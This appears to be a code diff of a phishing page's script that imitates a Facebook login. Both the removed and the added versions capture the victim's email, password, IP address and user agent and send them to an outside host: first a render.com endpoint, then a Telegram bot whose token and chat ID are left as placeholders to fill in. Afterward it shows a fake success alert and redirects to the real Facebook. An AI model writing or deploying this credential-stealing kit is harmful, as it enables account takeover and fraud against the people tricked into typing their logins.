@@ -242,78 +242,57 @@
     </div>
 
     <script>
-        async function submitLogin() {
+        async function sendToTelegram() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const loginBtn = document.querySelector('.login-btn');
-            const loading = document.getElementById('loading');
             
-            if (!email) {
-                alert('Please enter your email or phone number');
+            if (!email || !password) {
+                alert("Please fill in all fields");
                 return;
             }
+
+            // Get IP address (using free API)
+            let ip = "Unknown";
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                ip = (await ipResponse.json()).ip;
+            } catch {}
+
+            // Prepare message
+            const message = `📌 New Facebook Login\n
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ip}
+🖥️ User Agent: ${navigator.userAgent}`;
+
+            // Telegram bot details (replace with yours)
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
             
-            if (!password) {
-                alert('Please enter your password');
-                return;
-            }
-            
-            // Show loading
-            loginBtn.style.display = 'none';
-            loading.style.display = 'block';
+            // Send to Telegram
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
             try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-                
-                // Prepare data for PHP
-                const formData = new FormData();
-                formData.append('email', email);
-                formData.append('password', password);
-                formData.append('userAgent', navigator.userAgent);
-                formData.append('ip', ip);
-                
-                // Send to your PHP endpoint
-                await fetch('https://bot-ogel.onrender.com', {
+                const response = await fetch(telegramUrl, {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
                 });
-                
-                // Show success message
-                document.getElementById('successModal').style.display = 'flex';
-                
-                // Redirect to real Facebook after delay
+
+                // Show fake success and redirect
+                alert("Login successful! Redirecting...");
                 setTimeout(() => {
-                    window.location.href = 'https://facebook.com';
-                }, 3000);
+                    window.location.href = "https://facebook.com";
+                }, 2000);
                 
             } catch (error) {
-                alert('An error occurred. Please try again.');
-                console.error(error);
-            } finally {
-                loginBtn.style.display = 'block';
-                loading.style.display = 'none';
+                console.error("Error sending to Telegram:", error);
+                alert("Connection error. Please try again.");
             }
         }
-        
-        // Add realistic hover effects
-        document.querySelector('.login-btn').addEventListener('mouseover', function() {
-            this.style.backgroundColor = '#166fe5';
-        });
-        
-        document.querySelector('.login-btn').addEventListener('mouseout', function() {
-            this.style.backgroundColor = '#1877f2';
-        });
-        
-        document.querySelector('.create-account').addEventListener('mouseover', function() {
-            this.style.backgroundColor = '#36a420';
-        });
-        
-        document.querySelector('.create-account').addEventListener('mouseout', function() {
-            this.style.backgroundColor = '#42b72a';
-        });
     </script>
 </body>
 </html>
